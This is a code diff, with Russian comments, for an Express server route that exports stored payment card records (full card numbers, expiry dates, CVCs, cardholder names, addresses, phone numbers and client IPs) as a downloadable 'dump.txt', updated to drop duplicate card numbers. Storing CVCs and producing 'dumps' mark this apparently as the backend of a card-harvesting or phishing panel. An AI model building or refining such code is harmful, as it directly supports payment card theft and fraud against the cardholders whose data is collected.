@@ -97,33 +97,54 @@ app.get('/api/cards', async (req, res) => {
 
 // Скачать дамп в текстовом формате
 app.get('/download-txt', async (req, res) => {
-  const rows = await db.all(`
-    SELECT
-      cards.id    AS cardId,
-      users.id    AS userId,
-      cards.clientNumber,
-      cards.phoneNumber,
-      cards.cardNumber,
-      cards.expiryMonth,
-      cards.expiryYear,
-      cards.cvc,
-      cards.cardName,
-      cards.clientIP,
-      cards.date,
-      users.address,
-      users.name
-    FROM cards
-    LEFT JOIN users ON cards.clientNumber = users.clientNumber
-  `);
-  const lines = rows.map(r =>
-    Object.entries(r)
-      .map(([k, v]) => `${k}=${v}`)
-      .join('\t')
-  );
-  const content = lines.join('\n');
-  res.setHeader('Content-Type', 'text/plain');
-  res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
-  res.send(content);
+  try {
+    // 1) Считаем все записи из JOIN
+    const rows = await db.all(`
+      SELECT
+        cards.id        AS cardId,
+        users.id        AS userId,
+        cards.clientNumber,
+        cards.phoneNumber,
+        cards.cardNumber,
+        cards.expiryMonth,
+        cards.expiryYear,
+        cards.cvc,
+        cards.cardName,
+        cards.clientIP,
+        cards.date,
+        users.address,
+        users.name
+      FROM cards
+      LEFT JOIN users
+        ON cards.clientNumber = users.clientNumber
+    `);
+
+    // 2) Оставляем только первые строки для каждого cardNumber
+    const seen = new Set();
+    const uniqueRows = [];
+    for (const r of rows) {
+      if (!seen.has(r.cardNumber)) {
+        seen.add(r.cardNumber);
+        uniqueRows.push(r);
+      }
+    }
+
+    // 3) Формируем текст по уникальным записям
+    const lines = uniqueRows.map(r =>
+      Object.entries(r)
+        .map(([k, v]) => `${k}=${v}`)
+        .join('\t')
+    );
+    const content = lines.join('\n');
+
+    // 4) Отдаём результат
+    res.setHeader('Content-Type', 'text/plain');
+    res.setHeader('Content-Disposition', 'attachment; filename="dump.txt"');
+    res.send(content);
+  } catch (e) {
+    console.error('Error in /download-txt:', e);
+    res.status(500).send('Ошибка генерации дампа');
+  }
 });
 
 // Скачать базу SQLite
